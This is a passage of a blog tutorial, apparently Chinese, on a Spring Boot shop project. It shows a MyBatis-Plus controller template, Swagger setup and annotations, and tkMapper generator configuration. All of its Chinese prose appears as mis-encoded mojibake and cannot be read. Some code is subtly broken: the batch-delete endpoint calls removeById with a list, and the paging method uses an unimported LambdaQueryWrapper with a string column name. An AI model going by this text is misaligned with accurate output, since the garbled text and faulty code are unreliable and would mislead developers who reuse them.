ä½¿ç”¨Freemarkerå¼•æ“æ¨¡æ¿ï¼Œé»˜è®¤çš„æ˜¯Velocityå¼•æ“æ¨¡æ¿</span>                .execute();    &#125;&#125;</code></pre><p>å®Œæˆåï¼Œç›´æ¥è¿è¡Œæ”¹å·¥å…·ç±»å°±å¯ä»¥ç›´æ¥ç”Ÿæˆä»¥ä¸‹æ–‡ä»¶ï¼š</p><p>UserMapper.java IUserService.java UserServiceImpl.java UserController.java</p><h2 id="3-Controlleræ¨¡æ¿"><a href="#3-Controlleræ¨¡æ¿" class="headerlink" title="3.Controlleræ¨¡æ¿"></a>3.Controlleræ¨¡æ¿</h2><p>å¯ä»¥æ ¹æ®éœ€è¦ä¿®æ”¹è‡ªå·±çš„æ¨¡æ¿</p><pre><code class="hljs kotlin"><span class="hljs-keyword">package</span> $&#123;<span class="hljs-keyword">package</span>.Controller&#125;;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.*;<span class="hljs-keyword">import</span> javax.<span class="hljs-keyword">annotation</span>.Resource;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;<span class="hljs-keyword">import</span> $&#123;<span class="hljs-keyword">package</span>.Service&#125;.$&#123;table.serviceName&#125;;<span class="hljs-keyword">import</span> $&#123;<span class="hljs-keyword">package</span>.Entity&#125;.$&#123;entity&#125;;#<span class="hljs-keyword">if</span>($&#123;restControllerStyle&#125;)<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RestController;#<span class="hljs-keyword">else</span><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;#end#<span class="hljs-keyword">if</span>($&#123;superControllerClassPackage&#125;)<span class="hljs-keyword">import</span> $&#123;superControllerClassPackage&#125;;#end<span class="hljs-comment">/**</span><span class="hljs-comment"> * &lt;p&gt;</span><span class="hljs-comment"> * $!&#123;table.comment&#125; å‰ç«¯æ§åˆ¶å™¨</span><span class="hljs-comment"> * &lt;/p&gt;</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> $&#123;author&#125;</span><span class="hljs-comment"> * <span class="hljs-doctag">@since</span> $&#123;date&#125;</span><span class="hljs-comment"> */</span>#<span class="hljs-keyword">if</span>($&#123;restControllerStyle&#125;)<span class="hljs-meta">@RestController</span>#<span class="hljs-keyword">else</span><span class="hljs-meta">@Controller</span>#end<span class="hljs-meta">@RequestMapping(<span class="hljs-meta-string">&quot;#if(<span class="hljs-subst">$&#123;package.ModuleName&#125;</span>)/<span class="hljs-subst">$&#123;package.ModuleName&#125;</span>#end/#if(<span class="hljs-subst">$&#123;controllerMappingHyphenStyle&#125;</span>)<span class="hljs-subst">$&#123;controllerMappingHyphen&#125;</span>#else<span class="hljs-subst">$&#123;table.entityPath&#125;</span>#end&quot;</span>)</span>#<span class="hljs-keyword">if</span>($&#123;kotlin&#125;)<span class="hljs-class"><span class="hljs-keyword">class</span> $</span>&#123;table.controllerName&#125;#<span class="hljs-keyword">if</span>($&#123;superControllerClass&#125;) : $&#123;superControllerClass&#125;()#end#<span class="hljs-keyword">else</span>    #<span class="hljs-keyword">if</span>($&#123;superControllerClass&#125;)    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> $</span>&#123;table.controllerName&#125; extends $&#123;superControllerClass&#125; &#123;    #<span class="hljs-keyword">else</span>    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> $</span>&#123;table.controllerName&#125; &#123;    #end<span class="hljs-meta">@Resource</span><span class="hljs-keyword">private</span> $&#123;table.serviceName&#125; $&#123;table.entityPath&#125;Service;<span class="hljs-comment">// æ–°å¢æˆ–è€…æ›´æ–°</span><span class="hljs-meta">@PostMapping</span><span class="hljs-keyword">public</span> boolean save(<span class="hljs-meta">@RequestBody</span> $&#123;entity&#125; $&#123;table.entityPath&#125;) &#123;        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.saveOrUpdate($&#123;table.entityPath&#125;);&#125;<span class="hljs-meta">@DeleteMapping(<span class="hljs-meta-string">&quot;/&#123;id&#125;&quot;</span>)</span><span class="hljs-keyword">public</span> <span class="hljs-built_in">Boolean</span> delete(<span class="hljs-meta">@PathVariable</span> Integer id) &#123;        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.removeById(id);&#125;<span class="hljs-meta">@PostMapping(<span class="hljs-meta-string">&quot;/del/batch&quot;</span>)</span><span class="hljs-keyword">public</span> boolean deleteBatch(<span class="hljs-meta">@RequestBody</span> List&lt;Integer&gt; ids) &#123;        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.removeById(ids);&#125;<span class="hljs-meta">@GetMapping</span><span class="hljs-keyword">public</span> List&lt;$&#123;entity&#125;&gt; findAll() &#123;        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.list();&#125;<span class="hljs-meta">@GetMapping(<span class="hljs-meta-string">&quot;/&#123;id&#125;&quot;</span>)</span><span class="hljs-keyword">public</span> $&#123;entity&#125; findOne(<span class="hljs-meta">@PathVariable</span> Integer id) &#123;        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.getById(id);&#125;<span class="hljs-meta">@GetMapping(<span class="hljs-meta-string">&quot;/page&quot;</span>)</span><span class="hljs-keyword">public</span> Page&lt;$&#123;entity&#125;&gt; findPage(<span class="hljs-meta">@RequestParam</span> Integer pageNum,<span class="hljs-meta">@RequestParam</span> Integer pageSize) &#123;        LambdaQueryWrapper&lt;$&#123;entity&#125;&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;();        queryWrapper.orderByDesc(<span class="hljs-string">&quot;id&quot;</span>);        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.page(new Page&lt;&gt;(pageNum, pageSize), queryWrapper);&#125;&#125;#end</code></pre><p>æ›´å¤šçš„æ¨¡æ¿å¯ä»¥åˆ°<code>com.baomidou.mybatis-plus-generator</code>åŒ…ä¸­å¤åˆ¶åˆ°é¡¹ç›®çš„<code>resources\templates</code>ä¸­ï¼Œæ ¹æ®è‡ªå·±çš„éœ€æ±‚ä¿®æ”¹æ¨¡æ¿</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220513194907662.png" alt="image-20220513194907662"></p><h1 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h1><h2 id="1-å¯¼å…¥ä¾èµ–-1"><a href="#1-å¯¼å…¥ä¾èµ–-1" class="headerlink" title="1.å¯¼å…¥ä¾èµ–"></a>1.å¯¼å…¥ä¾èµ–</h2><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><h2 id="2-åˆ›å»ºé…ç½®ç±»"><a href="#2-åˆ›å»ºé…ç½®ç±»" class="headerlink" title="2.åˆ›å»ºé…ç½®ç±»"></a>2.åˆ›å»ºé…ç½®ç±»</h2><p>å†<code>com.sunzy.fmmall.config.SwaggerConfig</code>è·¯å¾„ä¸‹åˆ›å»ºswaggerçš„é…ç½®ç±»</p><p>é…ç½®æ–‡æ¡£çš„å°é¢ä¿¡æ¯ åŒ…æ‹¬æ ‡é¢˜ï¼Œç‰ˆæœ¬ï¼Œä½œè€…ä¿¡æ¯</p><p>ä¿®æ”¹éœ€è¦æ‰«é¢çš„controlleråŒ…ä½ç½®å³å¯</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.config;<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<span class="hljs-keyword">import</span> springfox.documentation.builders.ApiInfoBuilder;<span class="hljs-keyword">import</span> springfox.documentation.builders.PathSelectors;<span class="hljs-keyword">import</span> springfox.documentation.builders.RequestHandlerSelectors;<span class="hljs-keyword">import</span> springfox.documentation.service.ApiInfo;<span class="hljs-keyword">import</span> springfox.documentation.service.Contact;<span class="hljs-keyword">import</span> springfox.documentation.spi.DocumentationType;<span class="hljs-keyword">import</span> springfox.documentation.spring.web.plugins.Docket;<span class="hljs-keyword">import</span> springfox.documentation.swagger2.annotations.EnableSwagger2;<span class="hljs-meta">@Configuration</span><span class="hljs-meta">@EnableSwagger2</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SwaggerConfig</span> </span>&#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * swaggerå¯ä»¥è‡ªåŠ¨ç”Ÿæˆæ¥å£æ–‡æ¡£</span><span class="hljs-comment">     * 1.é…ç½®ç”Ÿæˆæ–‡æ¡£çš„ä¿¡æ¯</span><span class="hljs-comment">     * 2.é…ç½®ç”Ÿæˆè§„åˆ™</span><span class="hljs-comment">     *</span><span class="hljs-comment">     */</span>    <span class="hljs-comment">/**</span><span class="hljs-comment">     * Docketç”¨æ¥å°è£…æ¥å£æ–‡æ¡£</span><span class="hljs-comment">     *</span><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Bean</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> Docket <span class="hljs-title">getDocket</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-comment">//åˆ›å»ºå°é¢ä¿¡æ¯å¯¹è±¡</span>        ApiInfoBuilder apiInfoBuilder = <span class="hljs-keyword">new</span> ApiInfoBuilder();        apiInfoBuilder.title(<span class="hljs-string">&quot;ã€Šé”‹è¿·å•†åŸã€‹åç«¯æ¥å£è¯´æ˜&quot;</span>)                .description(<span class="hljs-string">&quot;æ­¤æ–‡æ¡£è¯¦ç»†è¯´æ˜äº†é”‹è¿·å•†åŸé¡¹ç›®åç«¯æ¥å£è§„èŒƒ....&quot;</span>)                .version(<span class="hljs-string">&quot;v 2.0.1&quot;</span>)                .contact( <span class="hljs-keyword">new</span> Contact(<span class="hljs-string">&quot;sunzy&quot;</span>,<span class="hljs-string">&quot;www.suzny.com&quot;</span>,<span class="hljs-string">&quot;sunzy@wang.com&quot;</span>) );        ApiInfo apiInfo =  apiInfoBuilder.build();        Docket docket = <span class="hljs-keyword">new</span> Docket(DocumentationType.SWAGGER_2)                .apiInfo(apiInfo) <span class="hljs-comment">//æŒ‡å®šç”Ÿæˆçš„æ–‡æ¡£ä¸­çš„å°é¢ä¿¡æ¯ï¼šæ–‡æ¡£æ ‡é¢˜ã€ç‰ˆæœ¬ã€ä½œè€…</span>                .select()                .apis(RequestHandlerSelectors.basePackage(<span class="hljs-string">&quot;com.sunzy.fmmall.controller&quot;</span>))                .paths(PathSelectors.any())                .build();        <span class="hljs-keyword">return</span> docket;    &#125;&#125;</code></pre><p>å¯åŠ¨springbooté¡¹ç›®è®¿é—®é¡¹ç›®åœ°å€/swagger-ui.htmlå³å¯çœ‹åˆ°ç›¸å…³æ¥å£ä¿¡æ¯ï¼Œå¹¶å¯ä»¥è¿›è¡Œæµ‹è¯•</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710113522350.png" alt="image-20220710113522350"></p><h2 id="3-swaggeræ³¨è§£è¯´æ˜"><a href="#3-swaggeræ³¨è§£è¯´æ˜" class="headerlink" title="3.swaggeræ³¨è§£è¯´æ˜"></a>3.swaggeræ³¨è§£è¯´æ˜</h2><blockquote><p>Swaggeræä¾›ä¸€å¥—è¯¦ç»†çš„æ³¨è§£å¯ä»¥å¯¹æ¥å£è¿›è¡Œè¯¦ç»†çš„è¯´æ˜</p></blockquote><p>@Api ç±»æ³¨è§£ï¼Œå¯¹æ§åˆ¶å™¨ç±»æ·»åŠ æ­¤æ³¨è§£å¯ä»¥å¯¹æ§åˆ¶å™¨è¿›è¡ŒåŠŸèƒ½è¯´æ˜</p><pre><code class="hljs reasonml">@<span class="hljs-constructor">Api(<span class="hljs-params">value</span> = <span class="hljs-string">&quot;ç”¨æˆ·ç®¡ç†&quot;</span>, <span class="hljs-params">tags</span> = <span class="hljs-string">&quot;æä¾›ç”¨æˆ·æ³¨å†Œå’Œç™»å½•æœåŠ¡&quot;</span>)</span></code></pre><p>@ApiOperation æ–¹æ³•æ³¨è§£ï¼Œå¯¹æ¯ä¸ªæ–¹æ³•ä½œç”¨è¿›è¡Œè¯¦ç»†è¯´æ˜</p><pre><code class="hljs kotlin"><span class="hljs-meta">@ApiOperation(<span class="hljs-meta-string">&quot;ç”¨æˆ·ç™»å½•æ¥å£&quot;</span>)</span></code></pre><p>@ApiImplicitParamså’Œ@ApiImplicitParam å¯¹æ–¹æ³•ä¸­çš„å‚æ•°è¿›è¡Œè¯¦ç»†çš„è¯´æ˜ï¼ŒåŒ…æ‹¬å­—æ®µåï¼Œå¤‡æ³¨ï¼Œæ˜¯å¦å¿…é¡»ï¼Œä»¥åŠé»˜è®¤å€¼</p><pre><code class="hljs less"><span class="hljs-variable">@ApiImplicitParams</span>(        <span class="hljs-variable">@ApiImplicitParam</span>(dataType = <span class="hljs-string">&quot;string&quot;</span>, name = <span class="hljs-string">&quot;username&quot;</span>, value = <span class="hljs-string">&quot;ç”¨æˆ·è´¦å·&quot;</span>, required = true),        <span class="hljs-variable">@ApiImplicitParam</span>(dataType = <span class="hljs-string">&quot;string&quot;</span>, name = <span class="hljs-string">&quot;password&quot;</span>, value = <span class="hljs-string">&quot;ç”¨æˆ·å¯†ç &quot;</span>, required = true))</code></pre><p>@ApiModel å½“æ¥å£å‚æ•°å’Œè¿”å›å€¼ç±»å‹ä¸ºå¯¹è±¡ç±»å‹æ˜¯éœ€è¦æ·»åŠ æ­¤æ³¨è§£</p><pre><code class="hljs reasonml">@<span class="hljs-constructor">ApiModel(<span class="hljs-params">value</span> = <span class="hljs-string">&quot;ResultVOå¯¹è±¡&quot;</span>,<span class="hljs-params">description</span> = <span class="hljs-string">&quot;å°è£…æ¥å£è¿”å›ç»™å‰ç«¯çš„æ•°æ®&quot;</span>)</span></code></pre><p>@ApiModelProperty æ¨¡å‹ä¸­çš„æˆå‘˜å˜é‡è¿›è¡Œè¯´æ˜</p><pre><code class="hljs reasonml">@<span class="hljs-constructor">ApiModelProperty(<span class="hljs-params">value</span> = <span class="hljs-string">&quot;å“åº”çŠ¶æ€ç &quot;</span>,<span class="hljs-params">dataType</span> = <span class="hljs-string">&quot;int&quot;</span>)</span><span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> code;</code></pre><p>@ApiIngnoreæ¥å£æ–¹æ³•æ³¨è§£ï¼Œæ·»åŠ æ­¤æ³¨è§£çš„æ–¹æ³•ä¸ä¼šå‡ºç°åœ¨æ¥å£æ–‡æ¡£ä¸­</p><h2 id="4-swagger-uiæ’ä»¶"><a href="#4-swagger-uiæ’ä»¶" class="headerlink" title="4.swagger-uiæ’ä»¶"></a>4.swagger-uiæ’ä»¶</h2><p>å¯¼å…¥æ’ä»¶ä¾èµ–</p><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--swagger-uiæ’ä»¶ä¾èµ–--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.xiaoymin<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>swagger-bootstrap-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><p>è®¿é—®url:<a href="http://localhost:8080/doc.html">http://localhost:8080/doc.html</a> ,uiç•Œé¢è®¾è®¡æ›´åŠ ç¾è§‚</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710133641781.png" alt="image-20220710133641781"></p><h1 id="tkMapper"><a href="#tkMapper" class="headerlink" title="tkMapper"></a>tkMapper</h1><p>æ•´åˆtkmapper</p><h2 id="1-å¯¼å…¥ä¾èµ–-2"><a href="#1-å¯¼å…¥ä¾èµ–-2" class="headerlink" title="1.å¯¼å…¥ä¾èµ–"></a>1.å¯¼å…¥ä¾èµ–</h2><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>tk.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mapper-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><h2 id="2-é…ç½®application-ymlæ–‡ä»¶"><a href="#2-é…ç½®application-ymlæ–‡ä»¶" class="headerlink" title="2.é…ç½®application.ymlæ–‡ä»¶"></a>2.é…ç½®application.ymlæ–‡ä»¶</h2><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span>  <span class="hljs-attr">datasource:</span>    <span class="hljs-attr">druid:</span>      <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>      <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>      <span class="hljs-attr">password:</span> <span class="hljs-string">root</span>      <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/fmmall?characterEncoding=utf-8&amp;useSSL=false</span><span class="hljs-attr">mybatis:</span>  <span class="hljs-attr">mapper-locations:</span> <span class="hljs-string">classpath:mapper/*Mapper.xml</span>  <span class="hljs-attr">type-aliases-package:</span> <span class="hljs-string">com.sunzy.fmmall.dao</span></code></pre><h2 id="3-ä¿®æ”¹å¯åŠ¨ç±»"><a href="#3-ä¿®æ”¹å¯åŠ¨ç±»" class="headerlink" title="3.ä¿®æ”¹å¯åŠ¨ç±»"></a>3.ä¿®æ”¹å¯åŠ¨ç±»</h2><p>æ³¨æ„MapperScanéœ€è¦ä½¿ç”¨tkmapperåŒ…ä¸­çš„</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.tkmapper;<span class="hljs-comment">//import org.mybatis.spring.annotation.MapperScan;</span><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<span class="hljs-keyword">import</span> tk.mybatis.spring.annotation.MapperScan;<span class="hljs-meta">@SpringBootApplication</span><span class="hljs-comment">//@MapperScan(&quot;com.sunzy.tkmapper.dao&quot;)</span><span class="hljs-meta">@MapperScan(&quot;com.sunzy.tkmapper.dao&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TkmapperDemoApplication</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;        SpringApplication.run(TkmapperDemoApplication.class, args);    &#125;&#125;</code></pre><h2 id="4-é€†å‘å·¥ç¨‹"><a href="#4-é€†å‘å·¥ç¨‹" class="headerlink" title="4.é€†å‘å·¥ç¨‹"></a>4.é€†å‘å·¥ç¨‹</h2><p>å¯¼å…¥æ’ä»¶ä¾èµ–</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.generator<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-generator-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>                   <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>                       <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>                       <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>                       <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.47<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>                   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>                   <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>                       <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>tk.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>                       <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mapper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>                       <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>                   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>               <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>           <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></code></pre><p>æ·»åŠ é…ç½®æ–‡ä»¶GeneratorConfig.xml</p><p>è®°å¾—ä¿®æ”¹å¯¹åº”åŒ…å<code>&lt;!--**--&gt;</code>æ ‡è®°å¤„éœ€è¦ä¿®æ”¹</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">generatorConfiguration</span></span><span class="hljs-meta">        <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD MyBatis Generator Configuration</span></span><span class="hljs-meta"><span class="hljs-meta-string">1.0//EN&quot;</span></span><span class="hljs-meta">        <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">generatorConfiguration</span>&gt;</span>    <span class="hljs-comment">&lt;!-- å¼•â¼Šæ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>    <span class="hljs-comment">&lt;!-- &lt;properties resource=&quot;jdbc.properties&quot;/&gt;--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">context</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Mysql&quot;</span> <span class="hljs-attr">targetRuntime</span>=<span class="hljs-string">&quot;MyBatis3Simple&quot;</span></span><span class="hljs-tag">             <span class="hljs-attr">defaultModelType</span>=<span class="hljs-string">&quot;flat&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;beginningDelimiter&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;`&quot;</span>/&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;endingDelimiter&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;`&quot;</span>/&gt;</span>        <span class="hljs-comment">&lt;!-- é…ç½® GeneralDAO --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;tk.mybatis.mapper.generator.MapperPlugin&quot;</span>&gt;</span>             <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mappers&quot;</span></span><span class="hljs-tag">                      <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.general.GeneralDao&quot;</span>/&gt;</span><span class="hljs-comment">&lt;!--**--&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>        <span class="hljs-comment">&lt;!-- é…ç½®æ•°æ®åº“è¿æ¥ --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">jdbcConnection</span> <span class="hljs-attr">driverClass</span>=<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span></span><span class="hljs-tag">                        <span class="hljs-attr">connectionURL</span>=<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/fmmall?useSSL=false&quot;</span> </span><span class="hljs-tag">                        <span class="hljs-attr">userId</span>=<span class="hljs-string">&quot;root&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--**--&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">jdbcConnection</span>&gt;</span>        <span class="hljs-comment">&lt;!-- é…ç½®å®ä½“ç±»å­˜æ”¾è·¯å¾„ --&gt;</span>        &lt;javaModelGenerator                targetPackage=&quot;com.sunzy.fmmall.entity&quot;                targetProject=&quot;src/main/java&quot;/&gt;   <span class="hljs-comment">&lt;!--**--&gt;</span>        <span class="hljs-comment">&lt;!-- é…ç½® XML å­˜æ”¾è·¯å¾„ --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">sqlMapGenerator</span> <span class="hljs-attr">targetPackage</span>=<span class="hljs-string">&quot;/&quot;</span></span><span class="hljs-tag">                         <span class="hljs-attr">targetProject</span>=<span class="hljs-string">&quot;src/main/resources/mapper&quot;</span>/&gt;</span> <span class="hljs-comment">&lt;!--**--&gt;</span>        <span class="hljs-comment">&lt;!-- é…ç½® DAO å­˜æ”¾è·¯å¾„ --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">javaClientGenerator</span> <span class="hljs-attr">targetPackage</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.dao&quot;</span></span><span class="hljs-tag">                             <span class="hljs-attr">targetProject</span>=<span class="hljs-string">&quot;src/main/java&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;XMLMAPPER&quot;</span>/&gt;</span>  <span class="hljs-comment">&lt;!--**--&gt;</span>        <span class="hljs-comment">&lt;!-- é…ç½®éœ€è¦æŒ‡å®šâ½£æˆçš„æ•°æ®åº“å’Œè¡¨ï¼Œ% ä»£è¡¨æ‰€æœ‰è¡¨ --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">tableName</span>=<span class="hljs-string">&quot;%&quot;</span>&gt;</span>            <span class="hljs-comment">&lt;!-- mysql é…ç½® --&gt;</span>            <span class="hljs-comment">&lt;!-- &lt;generatedKey column=&quot;id&quot; sqlStatement=&quot;Mysql&quot;</span><span class="hljs-comment">            identity=&quot;true&quot;/&gt;--&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>        <span class="hljs-comment">&lt;!-- &lt;table tableName=&quot;tb_roles&quot;&gt;--&gt;</span>        <span class="hljs-comment">&lt;!-- &amp;lt;!&amp;ndash; mysql é…ç½® &amp;ndash;&amp;gt;--&gt;</span>        <span class="hljs-comment">&lt;!-- &lt;generatedKey column=&quot;roleid&quot; sqlStatement=&quot;Mysql&quot;</span><span class="hljs-comment">        identity=&quot;true&quot;/&gt;--&gt;</span>        <span class="hljs-comment">&lt;!-- &lt;/table&gt;--&gt;</span>        <span class="hljs-comment">&lt;!-- &lt;table tableName=&quot;tb_permissions&quot;&gt;--&gt;</span>        <span class="hljs-comment">&lt;!-- &amp;lt;!&amp;ndash; mysql é…ç½® &amp;ndash;&amp;gt;--&gt;</span>        <span class="hljs-comment">&lt;!-- &lt;generatedKey column=&quot;perid&quot; sqlStatement=&quot;Mysql&quot;</span><span class="hljs-comment">        identity=&quot;true&quot;/&gt;--&gt;</span>        <span class="hljs-comment">&lt;!-- &lt;/table&gt;--&gt;</span>    <span class="hljs-tag">&lt;/<span 